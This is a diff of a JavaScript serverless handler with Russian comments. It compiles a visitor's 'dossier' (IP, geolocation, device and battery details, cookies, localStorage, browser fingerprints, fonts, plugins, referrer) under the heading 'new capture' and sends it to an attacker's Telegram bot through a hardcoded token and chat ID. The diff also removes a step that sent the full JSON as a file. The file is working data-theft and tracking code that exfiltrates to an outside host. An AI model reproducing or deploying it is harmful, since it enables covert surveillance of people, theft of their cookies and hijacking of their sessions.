@@ -5,74 +5,70 @@ export default async function handler(req, res) {
     const BOT_TOKEN = "8766394398:AAHuiigCpIiMoDhh2pz5YsNcmpEQTCvJtxc";
     const CHAT_ID = "8510274209";
 
-    // -------- Красивое текстовое досье ----------
-    const ip = data.ip || "неизвестен";
+    // Формируем красивый текст
+    const ip = data.ip || "неизв";
     const geo = data.geo
         ? `${data.geo.lat.toFixed(4)}, ${data.geo.lon.toFixed(4)} (точность ${data.geo.accuracy}м)`
         : "не определена";
+    const localIP = data.localIP ? ` (локальный: ${data.localIP})` : "";
     const device = `${data.platform || "?"}, ${data.screen || "?"}, ${data.orientation || ""}`;
-    const fingerprint = [
-        data.canvas ? `Canvas: ${data.canvas.substring(0, 30)}…` : "",
-        data.webgl ? `WebGL: ${data.webgl}` : "",
-        data.audio ? `Audio: ${data.audio}` : ""
-    ].filter(Boolean).join(" | ");
-    const battery = data.battery || "неизвестно";
-    const network = data.network || "неизвестно";
-    const memory = data.deviceMemory ? `${data.deviceMemory} ГБ` : "неизвестно";
+    const battery = data.battery || "неизв";
+    const network = data.network || "неизв";
+    const memory = data.deviceMemory ? `${data.deviceMemory} ГБ` : "неизв";
     const cores = data.hardwareConcurrency || "?";
+    const cookies = data.cookies || "нет";
+    const localStorageSize = data.localStorage ? data.localStorage.length : 0;
+    const fingerprintParts = [];
+    if (data.canvas) fingerprintParts.push("Canvas");
+    if (data.webgl) fingerprintParts.push("WebGL");
+    if (data.audio) fingerprintParts.push("Audio");
+    const fp = fingerprintParts.length ? fingerprintParts.join(", ") : "не собран";
 
-    const text = [
+    const dateStr = new Date(data.timestamp).toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });
+
+    const message = [
         `💀 **НОВЫЙ ЗАХВАТ**`,
+        `🕒 **Дата:** ${dateStr}`,
         ``,
-        `📍 **IP:** \`${ip}\``,
+        `📍 **IP:** \`${ip}\`${localIP}`,
         `🌍 **Гео:** ${geo}`,
         `📱 **Устройство:** ${device}`,
         `🔋 **Батарея:** ${battery}`,
         `📶 **Сеть:** ${network}`,
         `🧠 **CPU:** ${cores} ядер | RAM: ${memory}`,
-        `🍪 **Cookies:** ${data.cookies || "нет"}`,
-        `📦 **LocalStorage:** ${data.localStorage ? data.localStorage.length : 0} символов`,
-        `🕵️ **Фингерпринт:** ${fingerprint || "не собран"}`,
-        `🕒 **Время:** ${data.timestamp || "?"}`
+        `🍪 **Cookies:** ${cookies}`,
+        `📦 **LocalStorage:** ${localStorageSize} символов`,
+        `🕵️ **Фингерпринты:** ${fp}`,
+        ``,
+        `📄 **Детали:**`,
+        `Canvas: ${data.canvas ? data.canvas.substring(0,40)+"…" : "нет"}`,
+        `WebGL: ${data.webgl || "нет"}`,
+        `Audio: ${data.audio || "нет"}`,
+        `Плагины: ${data.plugins || "нет"}`,
+        `MIME-типы: ${data.mimeTypes || "нет"}`,
+        `Шрифты: ${data.fonts || "нет"}`,
+        `Языки: ${(data.languages || []).join(", ")}`,
+        `Часовой пояс: ${data.timezone || "?"}`,
+        `Do Not Track: ${data.doNotTrack || "?"}`,
+        `Онлайн: ${data.online ? "да" : "нет"}`,
+        `Referrer: ${data.referrer || "нет"}`,
+        `URL: ${data.url || "нет"}`
     ].join("\n");
 
     try {
-        // 1. Отправляем красивое текстовое досье
+        // Отправляем одно сообщение
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
-                text: text,
+                text: message,
                 parse_mode: "Markdown",
                 disable_web_page_preview: true
             })
         });
-
-        // 2. Отправляем полный JSON как файл
-        const jsonStr = JSON.stringify(data, null, 2);
-        const blob = new Blob([jsonStr], { type: "application/json" });
-        const form = new FormData();
-        form.append("chat_id", CHAT_ID);
-        form.append("document", blob, `dossier_${ip}.json`);
-        form.append("caption", `📁 Полное досье (${ip})`);
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-            method: "POST",
-            body: form
-        });
-
     } catch (error) {
-        // Если что-то пошло не так – шлём JSON прямо в чат
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
-                parse_mode: "Markdown"
-            })
-        });
+        console.error("Ошибка отправки:", error);
     }
 
     res.status(200).json({ status: "ok" });
